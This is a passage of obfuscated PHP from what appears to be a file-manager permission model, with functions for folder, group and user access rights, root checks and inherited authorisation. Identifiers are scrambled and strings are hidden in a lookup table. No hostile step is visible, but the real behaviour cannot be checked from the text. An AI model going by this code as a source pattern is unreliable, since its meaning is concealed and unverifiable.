= Model($ò©–ÁŠ[1388])->sourceInfo($Õ¿‰±ëÖ); if ($Âëú‹à[$ò©–ÁŠ[460]] != $ò©–ÁŠ[91]) { return $this->sourceListAuth(array($Õ¿‰±ëÖ)); } if ($Âëú‹à[$ò©–ÁŠ[181]] != SourceModel::TYPE_GROUP) { return array(); } $Õ£Ó‰£« = 1; $úÂõèİÉ = array($Õ¿‰±ëÖ); if ($Âëú‹à[$ò©–ÁŠ[183]] == $ò©–ÁŠ[219] && $Âëú‹à[$ò©–ÁŠ[545]] != $Õ£Ó‰£«) { $úÂõèİÉ = $this->groupChidldAllRootSource($Âëú‹à[$ò©–ÁŠ[545]]); } $‘Â†Õ½ˆ = $this->field($ò©–ÁŠ[184])->group($ò©–ÁŠ[184])->select(); $‘Â†Õ½ˆ = array_to_keyvalue($‘Â†Õ½ˆ, $ò©–ÁŠ[12], $ò©–ÁŠ[184]); if (!$‘Â†Õ½ˆ) { return array(); } $ŞŒ÷ê½Ì = $ò©–ÁŠ[2140]; $‘ãÓŞŠ… = array($ò©–ÁŠ[184] => array($ò©–ÁŠ[7], $‘Â†Õ½ˆ), $ò©–ÁŠ[480] => $ò©–ÁŠ[219]); $²™Å¶ä› = Model($ò©–ÁŠ[869])->field($ŞŒ÷ê½Ì)->where($‘ãÓŞŠ…)->select(); $»¢ÙŞÛ = array($Õ¿‰±ëÖ); foreach ($²™Å¶ä› as $ë´òÖİ) { foreach ($úÂõèİÉ as $şºè—ñõ) { $²ƒ‘’© = $ò©–ÁŠ[50] . $şºè—ñõ . $ò©–ÁŠ[50]; $£ÆßÛ¿ì = $ë´òÖİ[$ò©–ÁŠ[560]] . $ë´òÖİ[$ò©–ÁŠ[184]] . $ò©–ÁŠ[50]; if (strstr($£ÆßÛ¿ì, $²ƒ‘’©)) { $»¢ÙŞÛ[] = $ë´òÖİ[$ò©–ÁŠ[184]]; break; } } } return $this->sourceListAuth($»¢ÙŞÛ); } private function sourceListAuth($ìÎà’œŞ) { $ü¶€˜Ë =& $_SERVER[³à¼î¯á]; $ğŞ¬‡Ùõ = Model($ü¶€˜Ë[1388])->sourceListInfo($ìÎà’œŞ, !0); $ÒÖ—‹Çƒ = $this->sourceAuthSelect($ìÎà’œŞ); $¶Ö¡Å„Ô = array(); $’õ‹ÜÈÍ = array(); foreach ($ğŞ¬‡Ùõ as $”´ÜšÎÍ) { unset($”´ÜšÎÍ[$ü¶€˜Ë[504]]); unset($”´ÜšÎÍ[$ü¶€˜Ë[502]]); unset($”´ÜšÎÍ[$ü¶€˜Ë[462]]); unset($”´ÜšÎÍ[$ü¶€˜Ë[90]]); $²ç…ã = $ÒÖ—‹Çƒ[$”´ÜšÎÍ[$ü¶€˜Ë[184]]]; if (!$²ç…ã) { continue; } $”´ÜšÎÍ[$ü¶€˜Ë[2141]] = $this->authTargetInfo($²ç…ã); $”´ÜšÎÍ[$ü¶€˜Ë[558]] = rtrim($”´ÜšÎÍ[$ü¶€˜Ë[564]], $ü¶€˜Ë[8]) . $ü¶€˜Ë[8] . ltrim($”´ÜšÎÍ[$ü¶€˜Ë[558]], $ü¶€˜Ë[8]); $¶Ö¡Å„Ô[] = $”´ÜšÎÍ; $ÆóÈ…ÆÏ = count(explode($ü¶€˜Ë[8], trim($”´ÜšÎÍ[$ü¶€˜Ë[558]], $ü¶€˜Ë[8]))); $’õ‹ÜÈÍ[] = $ÆóÈ…ÆÏ + ($”´ÜšÎÍ[$ü¶€˜Ë[33]] == $ü¶€˜Ë[78] ? 0 : 1000); } array_multisort($’õ‹ÜÈÍ, SORT_ASC, $¶Ö¡Å„Ô); return $¶Ö¡Å„Ô; } private function groupChidldAllRootSource($×ÒòÈ¯Ü) { $­‚Öè„ =& $_SERVER[³à¼î¯á]; $‡Â©éÉ = Model($­‚Öè„[2142])->groupChildrenAll($×ÒòÈ¯Ü); $³é´ı = array($­‚Öè„[183] => 0, $­‚Öè„[545] => array($­‚Öè„[7], $‡Â©éÉ), $­‚Öè„[181] => SourceModel::TYPE_GROUP); $ãÊÖÂÁ  = Model($­‚Öè„[869])->field($­‚Öè„[184])->where($³é´ı)->select(); $ãÊÖÂÁ  = array_to_keyvalue($ãÊÖÂÁ , $­‚Öè„[12], $­‚Öè„[184]); return $ãÊÖÂÁ ; } private function authTargetInfo($èç³´×‡) { $™Èèâ‰« =& $_SERVER[³à¼î¯á]; $óÉîí™ = array(); $Óã¹Æ£ = array(); $†¬İ³Şƒ = 2 << 25; foreach ($èç³´×‡ as $ğíê›ÊÀ) { $ã§Ì”š  = Model($™Èèâ‰«[547])->listData($ğíê›ÊÀ[$™Èèâ‰«[2061]]); if (!$ã§Ì”š ) { continue; } if ($ğíê›ÊÀ[$™Èèâ‰«[181]] == SourceModel::TYPE_USER) { $ƒ¯¯§ò = Model($™Èèâ‰«[553])->getInfoSimpleOuter($ğíê›ÊÀ[$™Èèâ‰«[545]]); if ($ƒ¯¯§ò[$™Èèâ‰«[1753]] == $™Èèâ‰«[1242]) { continue; } if ($ƒ¯¯§ò[$™Èèâ‰«[1753]] == $™Èèâ‰«[219]) { $ƒ¯¯§ò[$™Èèâ‰«[32]] = LNG($™Èèâ‰«[2143]); } } else { $ƒ¯¯§ò = Model($™Èèâ‰«[561])->getInfoSimple($ğíê›ÊÀ[$™Èèâ‰«[545]]); } if (!$ƒ¯¯§ò) { continue; } $ƒ¯¯§ò[$™Èèâ‰«[515]] = $ã§Ì”š ; $óÉîí™[] = $ƒ¯¯§ò; $µì¦îµ“ = 0; if ($ğíê›ÊÀ[$™Èèâ‰«[181]] == SourceModel::TYPE_GROUP) { $µì¦îµ“ = $†¬İ³Şƒ * 2; } if ($ğíê›ÊÀ[$™Èèâ‰«[181]] == SourceModel::TYPE_USER) { $µì¦îµ“ = $†¬İ³Şƒ; } if ($ğíê›ÊÀ[$™Èèâ‰«[181]] == SourceModel::TYPE_USER && $ğíê›ÊÀ[$™Èèâ‰«[545]] == $™Èèâ‰«[219]) { $µì¦îµ“ = 0; } $Óã¹Æ£[] = $ã§Ì”š [$™Èèâ‰«[462]] + $µì¦îµ“; } array_multisort($Óã¹Æ£, SORT_DESC, $óÉîí™); return $óÉîí™; } public function getAllChildrenByUser($æ“œñùÖ, $Öß—½») { $óõŠÕ€ä =& $_SERVER[³à¼î¯á]; $ç†®ûˆ = Model($óõŠÕ€ä[574])->getInfo($Öß—½»); if (!$Öß—½» || !$æ“œñùÖ || !$ç†®ûˆ) { return array(); } $™ğ¯·´ó = Model($óõŠÕ€ä[1388])->sourceInfo($æ“œñùÖ); $Ö‰„¶–Ç = array(); $†Ôœ” = 1; if ($™ğ¯·´ó[$óõŠÕ€ä[183]] == $óõŠÕ€ä[219] && $™ğ¯·´ó[$óõŠÕ€ä[545]] != $†Ôœ” && $this->groupContainUser($™ğ¯·´ó[$óõŠÕ€ä[545]], $Öß—½»)) { foreach ($ç†®ûˆ[$óõŠÕ€ä[2144]] as $ß¤œ“„Ë) { $·’­«Ûê = Model($óõŠÕ€ä[561])->getInfo($ß¤œ“„Ë[$óõŠÕ€ä[1952]]); $ì‡ÃÍ¬§ = Model($óõŠÕ€ä[574])->getInfoSimpleOuter($Öß—½»); $ì‡ÃÍ¬§[$óõŠÕ€ä[515]] = $ß¤œ“„Ë[$óõŠÕ€ä[462]]; if (Model($óõŠÕ€ä[547])->authCheckAction($ß¤œ“„Ë[$óõŠÕ€ä[462]][$óõŠÕ€ä[462]], $óõŠÕ€ä[1973])) { continue; } $ÃÁó˜ = array($óõŠÕ€ä[32] => $óõŠÕ€ä[1262] . $·’­«Ûê[$óõŠÕ€ä[32]], $óõŠÕ€ä[184] => $·’­«Ûê[$óõŠÕ€ä[90]][$óõŠÕ€ä[184]], $óõŠÕ€ä[87] => KodIO::make($·’­«Ûê[$óõŠÕ€ä[90]][$óõŠÕ€ä[184]]), $óõŠÕ€ä[183] => $óõŠÕ€ä[219], $óõŠÕ€ä[181] => $óõŠÕ€ä[554], $óõŠÕ€ä[33] => $óõŠÕ€ä[591], $óõŠÕ€ä[558] => $·’­«Ûê[$óõŠÕ€ä[565]], $óõŠÕ€ä[1952] => $·’­«Ûê[$óõŠÕ€ä[1952]], $óõŠÕ€ä[562] => $·’­«Ûê[$óõŠÕ€ä[183]], $óõŠÕ€ä[2141] => array($ì‡ÃÍ¬§)); $Ö‰„¶–Ç[$ÃÁó˜[$óõŠÕ€ä[184]]] = $ÃÁó˜; } } $ú­İšÌ = array(); $‹»ò¬¦ı = $this->getAllChildren($æ“œñùÖ); foreach ($‹»ò¬¦ı as $ÖäÒÃİÊ) { $©­úì¢ = !1; foreach ($ÖäÒÃİÊ[$óõŠÕ€ä[2141]] as $ş¾İ¼–Õ) { if ($ş¾İ¼–Õ[$óõŠÕ€ä[1753]]) { if ($ş¾İ¼–Õ[$óõŠÕ€ä[1753]] == $Öß—½») { $©­úì¢ = !0; break; } } if ($ş¾İ¼–Õ[$óõŠÕ€ä[1952]]) { if ($this->groupContainUser($ş¾İ¼–Õ[$óõŠÕ€ä[1952]], $Öß—½»)) { $©­úì¢ = !0; break; } } } if ($©­úì¢) { $ú­İšÌ[] = $ÖäÒÃİÊ; } $”÷ïôÅÏ = $ÖäÒÃİÊ[$óõŠÕ€ä[184]]; if (isset($Ö‰„¶–Ç[$”÷ïôÅÏ])) { $ÖäÒÃİÊ[$óõŠÕ€ä[2141]][] = $Ö‰„¶–Ç[$”÷ïôÅÏ][0]; $Ö‰„¶–Ç[$”÷ïôÅÏ] = !1; } } $Ö‰„¶–Ç = array_filter(array_values($Ö‰„¶–Ç)); $ú­İšÌ = array_merge($Ö‰„¶–Ç, $ú­İšÌ); return $ú­İšÌ; } public function setAllChildrenByUser($Ò®çÄ, $õ€âÒÂ, $¿¹¬ûğœ) { $Æ‹¼Ô² =& $_SERVER[³à¼î¯á]; $²·¸ = $this->getAllChildrenByUser($Ò®çÄ, $õ€âÒÂ); if (!$¿¹¬ûğœ || !$²·¸) { return !1; } foreach ($²·¸ as $ûÈ…±œ) { $Ã—³·Äğ = array(); foreach ($ûÈ…±œ[$Æ‹¼Ô²[2141]] as $Ä»ÖÚ»‡) { $ÜõØÅâÅ = $Ä»ÖÚ»‡[$Æ‹¼Ô²[515]]; $æšêÀúã = $Ä»ÖÚ»‡[$Æ‹¼Ô²[1753]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $šºØ†Œ = $Ä»ÖÚ»‡[$Æ‹¼Ô²[1753]] ? $Ä»ÖÚ»‡[$Æ‹¼Ô²[1753]] : $Ä»ÖÚ»‡[$Æ‹¼Ô²[1952]]; if ($Ä»ÖÚ»‡[$Æ‹¼Ô²[1753]] && $Ä»ÖÚ»‡[$Æ‹¼Ô²[1753]] == $õ€âÒÂ) { continue; } $Ã—³·Äğ[] = array($Æ‹¼Ô²[184] => $ûÈ…±œ[$Æ‹¼Ô²[184]], $Æ‹¼Ô²[181] => $æšêÀúã, $Æ‹¼Ô²[545] => intval($šºØ†Œ), $Æ‹¼Ô²[2061] => isset($ÜõØÅâÅ[$Æ‹¼Ô²[450]]) ? intval($ÜõØÅâÅ[$Æ‹¼Ô²[450]]) : 0, $Æ‹¼Ô²[2121] => isset($ÜõØÅâÅ[$Æ‹¼Ô²[2121]]) ? intval($ÜõØÅâÅ[$Æ‹¼Ô²[2121]]) : -1); } $Ã—³·Äğ[] = array($Æ‹¼Ô²[184] => $ûÈ…±œ[$Æ‹¼Ô²[184]], $Æ‹¼Ô²[181] => SourceModel::TYPE_USER, $Æ‹¼Ô²[545] => intval($õ€âÒÂ), $Æ‹¼Ô²[2061] => intval($¿¹¬ûğœ), $Æ‹¼Ô²[2121] => -1); $this->where(array($Æ‹¼Ô²[466] => $ûÈ…±œ[$Æ‹¼Ô²[184]]))->delete(); $this->addAll($Ã—³·Äğ); } return !0; } public function get($¶ÅÓŠ’) { $œÊÑ»‡ö = $this->getSourceList(array($¶ÅÓŠ’), !0); return $œÊÑ»‡ö[0]; } public function getSourceList($¢ê¡äßÕ, $·œ³ì…Ÿ = false, $°øøó = false) { $òÀÎÈ“ê =& $_SERVER[³à¼î¯á]; if (!$¢ê¡äßÕ) { return array(); } $Âˆğö´³ = Model($òÀÎÈ“ê[1388]); if (!$·œ³ì…Ÿ && count($¢ê¡äßÕ) == 1) { $·œ³ì…Ÿ = array(); $·œ³ì…Ÿ[$¢ê¡äßÕ[0]] = $Âˆğö´³->sourceInfo($¢ê¡äßÕ[0]); } if (!$·œ³ì…Ÿ) { $Ãïˆ“×ø = array($òÀÎÈ“ê[466] => array($òÀÎÈ“ê[467], $¢ê¡äßÕ)); $·œ³ì…Ÿ = $Âˆğö´³->field($òÀÎÈ“ê[2145])->where($Ãïˆ“×ø)->select(); $·œ³ì…Ÿ = array_to_keyvalue($·œ³ì…Ÿ, $òÀÎÈ“ê[184]); } $¬ĞäÀİÉ = $¢ê¡äßÕ; foreach ($·œ³ì…Ÿ as $ÕâÎ¢ğÃ => $¤×üêÈÚ) { $ºŞŠê‚ = $Âˆğö´³->parentLevelArray($¤×üêÈÚ[$òÀÎÈ“ê[560]]); $¬ĞäÀİÉ = array_merge($¬ĞäÀİÉ, array($ÕâÎ¢ğÃ), array_reverse($ºŞŠê‚)); } $¬ĞäÀİÉ = array_values(array_unique($¬ĞäÀİÉ)); if (!$¬ĞäÀİÉ) { return array(); } $Ù²Óòƒã = $this->sourceAuthSelect($¬ĞäÀİÉ); $Í†ÔŠ¢ = array(); foreach ($¬ĞäÀİÉ as $¹—™¥»ª) { if (isset($Ù²Óòƒã[$¹—™¥»ª])) { $Í†ÔŠ¢[$¹—™¥»ª] = $Ù²Óòƒã[$¹—™¥»ª]; } } $ëÈÎ±ïø = $this->userIsRoot($°øøó); $İúÀÇÒ½ = AuthModel::authAll(); $ûâœà©¦ = array($òÀÎÈ“ê[463] => $İúÀÇÒ½, $òÀÎÈ“ê[2146] => array($òÀÎÈ“ê[468] => 0, $òÀÎÈ“ê[1958] => $İúÀÇÒ½, $òÀÎÈ“ê[469] => LNG($òÀÎÈ“ê[2147]), $òÀÎÈ“ê[1975] => $òÀÎÈ“ê[2148])); $Ëßò†âˆ = array(); foreach ($·œ³ì…Ÿ as $¹—™¥»ª => $×úº•‹Ø) { if ($ëÈÎ±ïø && $GLOBALS[$òÀÎÈ“ê[6]][$òÀÎÈ“ê[1971]]) { $Ëßò†âˆ[$¹—™¥»ª] = $ûâœà©¦; continue; } $Ëßò†âˆ[$¹—™¥»ª] = $this->makeSourceAuth($×úº•‹Ø, $Í†ÔŠ¢, $°øøó); } return $Ëßò†âˆ; } public function authDeepCheck($€‘òö¥Ì, $ÜüàĞüæ = false) { $ú¨‰­øš =& $_SERVER[³à¼î¯á]; $ÜüàĞüæ = $ÜüàĞüæ ? $ÜüàĞüæ : USER_ID; $ÉÔ†é¢ = $this->makeAuthDeep($ÜüàĞüæ); if (!in_array($€‘òö¥Ì, $ÉÔ†é¢[$ú¨‰­øš[2149]])) { return !1; } $êæ«µ“ = array(); foreach ($ÉÔ†é¢[$ú¨‰­øš[2150]] as $ŠçıØ‹ò => $¯Á—¤ Ø) { if (!in_array($€‘òö¥Ì, $¯Á—¤ Ø)) { continue; } $êæ«µ“[] = $ŠçıØ‹ò; } if (!$êæ«µ“) { return !1; } $ƒõÈ™¤± = $êæ«µ“ ? $êæ«µ“[0] : $€‘òö¥Ì; return array($ú¨‰­øš[463] => -1, $ú¨‰­øš[515] => array($ú¨‰­øš[468] => $ú¨‰­øš[1242], $ú¨‰­øš[1958] => $ú¨‰­øš[219], $ú¨‰­øš[469] => LNG($ú¨‰­øš[2151]), $ú¨‰­øš[1975] => $ú¨‰­øš[2152]), $ú¨‰­øš[2153] => LNG($ú¨‰­øš[2154]), $ú¨‰­øš[2155] => $this->sourceAuthInfo($ƒõÈ™¤±)); } protected function makeAuthDeep($Ú¯ªœæÎ = false) { $öÜ½‹à =& $_SERVER[³à¼î¯á]; static $‹ôÄÍ”« = array(); $Ú¯ªœæÎ = $Ú¯ªœæÎ ? $Ú¯ªœæÎ : USER_ID; if (isset($‹ôÄÍ”«[$Ú¯ªœæÎ])) { return $‹ôÄÍ”«[$Ú¯ªœæÎ]; } $ç´‡´—¾ = Model($öÜ½‹à[2156])->listData(); $¿Ü¦Úş‡ = array(); foreach ($ç´‡´—¾ as $ÁĞŒ®µ) { if ($ÁĞŒ®µ[$öÜ½‹à[462]] == 0 && $ÁĞŒ®µ[$öÜ½‹à[1974]] == $öÜ½‹à[91]) { $¿Ü¦Úş‡[] = $ÁĞŒ®µ[$öÜ½‹à[450]]; } } $œÔ›¶†ô = $this->userGroupParents($Ú¯ªœæÎ); $Á˜¡÷Ì“ = array($öÜ½‹à[181] => SourceModel::TYPE_USER, $öÜ½‹à[545] => $Ú¯ªœæÎ); if ($œÔ›¶†ô) { $Á˜¡÷Ì“ = array(array($öÜ½‹à[181] => SourceModel::TYPE_USER, $öÜ½‹à[545] => $Ú¯ªœæÎ), array($öÜ½‹à[181] => SourceModel::TYPE_GROUP, $öÜ½‹à[545] => array($öÜ½‹à[467], $œÔ›¶†ô)), $öÜ½‹à[1050] => $öÜ½‹à[2055]); } $¹•Ü›¢æ = $this->field($öÜ½‹à[2157])->where($Á˜¡÷Ì“)->select(); $ÄÒ÷ëª¬ = array(); $óæâ»è­ = array_to_keyvalue_group($¹•Ü›¢æ, $öÜ½‹à[184]); foreach ($óæâ»è­ as $©É£Œ¨™ => $É‰¤•ùÒ) { $æß½éÇŒ = $this->authArrayCheck($É‰¤•ùÒ, $Ú¯ªœæÎ); if ($æß½éÇŒ[$öÜ½‹à[463]] > 0) { $ÄÒ÷ëª¬[] = $©É£Œ¨™ . $öÜ½‹à[12]; } } if ($œÔ›¶†ô) { $Ò‘áëö´ = Model($öÜ½‹à[561]); foreach ($œÔ›¶†ô as $Ïï˜×Òİ) { $‹ÅªÍÍ = $Ò‘áëö´->getInfo($Ïï˜×Òİ); if (!$‹ÅªÍÍ || !is_array($‹ÅªÍÍ[$öÜ½‹à[90]])) { continue; } $ÄÒ÷ëª¬[] = $‹ÅªÍÍ[$öÜ½‹à[90]][$öÜ½‹à[184]]; } } $Ïü‘œ  = array(); $´†ƒ‰°Ş = $œÔ›¶†ô; $òì¢°Š‰ = Model($öÜ½‹à[1388]); $Ò‘áëö´ = Model($öÜ½‹à[561]); $¨‹À¨  = array(); $¼ğ¢„Â´ = array(); $Û½•¶÷¢ = array(); $¹Ûùªšã = array(); if ($ÄÒ÷ëª¬) { $Ÿ Å’³¿ = $òì¢°Š‰->where(array($öÜ½‹à[184] => array($öÜ½‹à[467], $ÄÒ÷ëª¬)))->select(); foreach ($Ÿ Å’³¿ as $½ú«ı£†) { $™œ‚›Â = $òì¢°Š‰->parentLevelArray($½ú«ı£†[$öÜ½‹à[560]]); $Ïü‘œ  = array_merge($Ïü‘œ , $™œ‚›Â); $´†ƒ‰°Ş[] = $½ú«ı£†[$öÜ½‹à[545]]; $¨‹À¨ [$½ú«ı£†[$öÜ½‹à[184]]] = $™œ‚›Â; $¼ğ¢„Â´[$½ú«ı£†[$öÜ½‹à[184]]] = $½ú«ı£†[$öÜ½‹à[545]]; } } $´†ƒ‰°Ş = array_values(array_unique($´†ƒ‰°Ş)); $‚ê¢˜Š = $´†ƒ‰°Ş; foreach ($‚ê¢˜Š as $Ïï˜×Òİ) { $‹ÅªÍÍ = $Ò‘áëö´->getInfo($Ïï˜×Òİ); $™œ‚›Â = $òì¢°Š‰->parentLevelArray($‹ÅªÍÍ[$öÜ½‹à[560]]); $´†ƒ‰°Ş = array_merge($´†ƒ‰°Ş, $™œ‚›Â); } $´†ƒ‰°Ş = array_values(array_unique($´†ƒ‰°Ş)); foreach ($´†ƒ‰°Ş as $Ïï˜×Òİ) { $‹ÅªÍÍ = $Ò‘áëö´->getInfo($Ïï˜×Òİ); $Ïü‘œ [] = $‹ÅªÍÍ[$öÜ½‹à[90]][$öÜ½‹à[184]]; $Û½•¶÷¢[$Ïï˜×Òİ] = $‹ÅªÍÍ[$öÜ½‹à[90]][$öÜ½‹à[184]]; $¹Ûùªšã[$Ïï˜×Òİ] = $òì¢°Š‰->parentLevelArray($‹ÅªÍÍ[$öÜ½‹à[560]]); } foreach ($¨‹À¨  as $¾à²é‹ => $Ò‰ØìÏ’) { $İÖˆ­Ò— = $¼ğ¢„Â´[$¾à²é‹]; if (!$İÖˆ­Ò— || !$Û½•¶÷¢[$İÖˆ­Ò—]) { continue; } $É¢¦œØœ = array(); foreach ($¹Ûùªšã[$İÖˆ­Ò—] as $Ïï˜×Òİ) { $É¢¦œØœ[] = $Û½•¶÷¢[$Ïï˜×Òİ]; } $¨‹À¨ [$¾à²é‹] = array_merge($É¢¦œØœ, $Ò‰ØìÏ’); } $Ïü‘œ  = array_values(array_unique($Ïü‘œ )); $¨ŒöÅ©ß = array($öÜ½‹à[2149] => $Ïü‘œ , $öÜ½‹à[2150] => $¨‹À¨ ); $‹ôÄÍ”«[$Ú¯ªœæÎ] = $¨ŒöÅ©ß; return $¨ŒöÅ©ß; } private function makeSourceAuth($È€«ÒÛ¢, $©³¾ºô¢, $èˆæßü¤ = false) { $ñÔäòåø =& $_SERVER[³à¼î¯á]; $ÀÎöë¦ = $ñÔäòåø[91]; $¦•Ùûş‘ = $È€«ÒÛ¢[$ñÔäòåø[545]]; $˜²ßªû = $È€«ÒÛ¢[$ñÔäòåø[181]] == SourceModel::TYPE_GROUP; $çÙêâé = $˜²ßªû ? $this->groupRootAuth($¦•Ùûş‘, $èˆæßü¤) : !1; if ($çÙêâé && Model($ñÔäòåø[547])->authCheckAction($çÙêâé[$ñÔäòåø[462]], $ñÔäòåø[1973])) { return $this->groupAuthInfo($çÙêâé, $¦•Ùûş‘); } $ÒˆºÑã€ = Model($ñÔäòåø[1388])->parentLevelArray($È€«ÒÛ¢[$ñÔäòåø[560]]); $ÒˆºÑã€ = array_merge(array($È€«ÒÛ¢[$ñÔäòåø[184]]), array_reverse($ÒˆºÑã€)); $ÆŸ­™Ê = !1; foreach ($ÒˆºÑã€ as $¡ÎÊŠŠ¥) { if (!isset($©³¾ºô¢[$¡ÎÊŠŠ¥])) { continue; } $¹“‘Âê = $this->authMake($©³¾ºô¢[$¡ÎÊŠŠ¥], $èˆæßü¤); if ($¹“‘Âê[$ñÔäòåø[515]]) { $ÆŸ­™Ê = $¹“‘Âê; break; } } if (!$˜²ßªû) { return $ÆŸ­™Ê; } if (!$ÆŸ­™Ê && $çÙêâé) { $ÆŸ­™Ê = $this->groupAuthInfo($çÙêâé, $¦•Ùûş‘); } if (!$ÆŸ­™Ê) { $ÚĞ¦ïøÒ = Model($ñÔäòåø[561])->getInfo($¦•Ùûş‘); $¸«Ÿò÷ = explode($ñÔäòåø[50], trim($ÚĞ¦ïøÒ[$ñÔäòåø[560]], $ñÔäòåø[50])); $¸«Ÿò÷ = array_reverse($¸«Ÿò÷); foreach ($¸«Ÿò÷ as $Ôù£Æ¶) { if ($Ôù£Æ¶ == $ñÔäòåø[219] || $Ôù£Æ¶ == $ÀÎöë¦) { continue; } $Ø·èôÛ‘ = $this->groupRootAuth($Ôù£Æ¶, $èˆæßü¤); if (!$Ø·èôÛ‘) { continue; } $ÆŸ­™Ê = $this->groupAuthInfo($Ø·èôÛ‘, $Ôù£Æ¶); break; } } if (!$ÆŸ­™Ê || $ÆŸ­™Ê[$ñÔäòåø[463]] <= 0) { $Å³âÉ…¬ = $this->authDeepCheck($È€«ÒÛ¢[$ñÔäòåø[184]], $èˆæßü¤); if ($Å³âÉ…¬) { $ÆŸ­™Ê = $Å³âÉ…¬; } } return $ÆŸ­™Ê; } private function userIsRoot($şÎ“²× = false) { $‚¥ùò²ç =& $_SERVER[³à¼î¯á]; if (!$şÎ“²× && KodUser::isRoot()) { return !0; } $É¢š‹Å— = Model($‚¥ùò²ç[574])->getInfo($şÎ“²×); $àÇâÉÑÎ = Model($‚¥ùò²ç[2158])->listData($É¢š‹Å—[$‚¥ùò²ç[2159]]); if ($àÇâÉÑÎ && $àÇâÉÑÎ[$‚¥ùò²ç[551]][$‚¥ùò²ç[2160]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÃïÆÍº) { $şÔÒË˜Ÿ =& $_SERVER[³à¼î¯á]; $„¤œÊÔ‘ = Model($şÔÒË˜Ÿ[1388]); $Ÿã†³„š = $„¤œÊÔ‘->sourceInfo($ÃïÆÍº); if (!$Ÿã†³„š) { return !1; } $„¤œÊÔ‘->groupPathDisplay($Ÿã†³„š); $¤­Â§µœ = array($Ÿã†³„š); $¤­Â§µœ = $„¤œÊÔ‘->_listAppendPath($¤­Â§µœ); $Ÿã†³„š = $¤­Â§µœ[0]; $ïÜğÑš = $Ÿã†³„š[$şÔÒË˜Ÿ[558]]; if (isset($Ÿã†³„š[$şÔÒË˜Ÿ[566]])) { $Í¤êóìş = explode($şÔÒË˜Ÿ[8], trim($Ÿã†³„š[$şÔÒË˜Ÿ[558]], $şÔÒË˜Ÿ[8])); array_shift($Í¤êóìş); $ïÜğÑš = $Ÿã†³„š[$şÔÒË˜Ÿ[564]] . $şÔÒË˜Ÿ[2161] . implode($şÔÒË˜Ÿ[8], $Í¤êóìş); } return array($şÔÒË˜Ÿ[469] => $Ÿã†³„š[$şÔÒË˜Ÿ[32]], $şÔÒË˜Ÿ[87] => KodIO::make($Ÿã†³„š[$şÔÒË˜Ÿ[184]]), $şÔÒË˜Ÿ[2162] => $ïÜğÑš); } private function groupAuthInfo($è‰æ„Ãä, $ûší‡ñÅ) { $ØÜ€èÈŞ =& $_SERVER[³à¼î¯á]; $²­êÇ‚Û = Model($ØÜ€èÈŞ[561])->getInfo($ûší‡ñÅ); return array($ØÜ€èÈŞ[2163] => intval($è‰æ„Ãä[$ØÜ€èÈŞ[462]]), $ØÜ€èÈŞ[2146] => $è‰æ„Ãä, $ØÜ€èÈŞ[2164] => LNG($ØÜ€èÈŞ[2165]), $ØÜ€èÈŞ[2155] => array($ØÜ€èÈŞ[469] => $²­êÇ‚Û[$ØÜ€èÈŞ[32]], $ØÜ€èÈŞ[87] => KodIO::make($²­êÇ‚Û[$ØÜ€èÈŞ[90]][$ØÜ€èÈŞ[184]]), $ØÜ€èÈŞ[2162] => $²­êÇ‚Û[$ØÜ€èÈŞ[565]])); } protected function groupRootAuth($î‹¸‚Âî, $Ê¼±’“ü = false) { $Œ€§£Àˆ =& $_SERVER[³à¼î¯á]; $Ê¼±’“ü = $Ê¼±’“ü ? $Ê¼±’“ü : USER_ID; $ğÆƒùÈÍ = $Ê¼±’“ü . $Œ€§£Àˆ[2166] . $î‹¸‚Âî; static $¶Şì˜ = array(); if (isset($¶Şì˜[$ğÆƒùÈÍ])) { return $¶Şì˜[$ğÆƒùÈÍ]; } $°ñìæ”„ = Model($Œ€§£Àˆ[561])->getInfo($î‹¸‚Âî); $Š»“ì° = $this->userGroupList($Ê¼±’“ü); $›Ï¯ĞÉ½ = isset($Š»“ì°[$î‹¸‚Âî]) ? $Š»“ì°[$î‹¸‚Âî][$Œ€§£Àˆ[462]] : !1; if ($›Ï¯ĞÉ½ && Model($Œ€§£Àˆ[547])->authCheckAction($›Ï¯ĞÉ½[$Œ€§£Àˆ[462]], $Œ€§£Àˆ[1973])) { $¶Şì˜[$ğÆƒùÈÍ] = $›Ï¯ĞÉ½; return $›Ï¯ĞÉ½; } $À²¯ãò = $this->sourceAuthSelect($°ñìæ”„[$Œ€§£Àˆ[90]][$Œ€§£Àˆ[184]]); $â¹ü‚Ë = $À²¯ãò ? $this->authMake($À²¯ãò, $Ê¼±’“ü) : !1; $«±ØäÁ” = $â¹ü‚Ë ? $â¹ü‚Ë[$Œ€§£Àˆ[515]] : !1; $¶Şì˜[$ğÆƒùÈÍ] = $«±ØäÁ” ? $«±ØäÁ” : $›Ï¯ĞÉ½; return $¶Şì˜[$ğÆƒùÈÍ]; } public function authOwnerApply($²ê¹Ä»™) { $Ôä¸É¯€ =& $_SERVER[³à¼î¯á]; if (empty($²ê¹Ä»™[$Ôä¸É¯€[462]]) || isset($²ê¹Ä»™[$Ôä¸É¯€[2167]]) && $²ê¹Ä»™[$Ôä¸É¯€[2167]]) { return $²ê¹Ä»™; } if (AuthModel::authCheckRoot($²ê¹Ä»™[$Ôä¸É¯€[462]][$Ôä¸É¯€[463]])) { return $²ê¹Ä»™; } $ø‹íÖÏÍ = Model($Ôä¸É¯€[1388])->parentLevelArray($²ê¹Ä»™[$Ôä¸É¯€[560]]); $ø‹íÖÏÍ = array_merge(array($²ê¹Ä»™[$Ôä¸É¯€[184]]), array_reverse($ø‹íÖÏÍ)); $ûÆö¡ = $this->sourceAuthSelect($ø‹íÖÏÍ); $Ô¦¤÷à = array(); $üÄìÒƒ = array(); foreach ($ûÆö¡ as $’Š×ü›ç => $ß°­Ìçª) { $ˆ¤êØ¯• = $this->authFolderOwnerUser($ß°­Ìçª); $Ô¦¤÷à[$’Š×ü›ç] = $ˆ¤êØ¯•; $üÄìÒƒ = array_merge($üÄìÒƒ, $ˆ¤êØ¯•[$Ôä¸É¯€[637]]); if ($ˆ¤êØ¯•[$Ôä¸É¯€[2168]]) { break; } } if (count($üÄìÒƒ) == 0) { $üÄìÒƒ = $this->authFolderOwnerGroup($²ê¹Ä»™[$Ôä¸É¯€[545]]); } $üÄìÒƒ = array_unique($üÄìÒƒ); if (AuthModel::authCheckRoot($²ê¹Ä»™[$Ôä¸É¯€[462]][$Ôä¸É¯€[463]])) { $üÄìÒƒ[] = USER_ID; } $²ê¹Ä»™[$Ôä¸É¯€[462]][$Ôä¸É¯€[2169]] = Model($Ôä¸É¯€[553])->userListInfo($üÄìÒƒ); return $²ê¹Ä»™; } private function 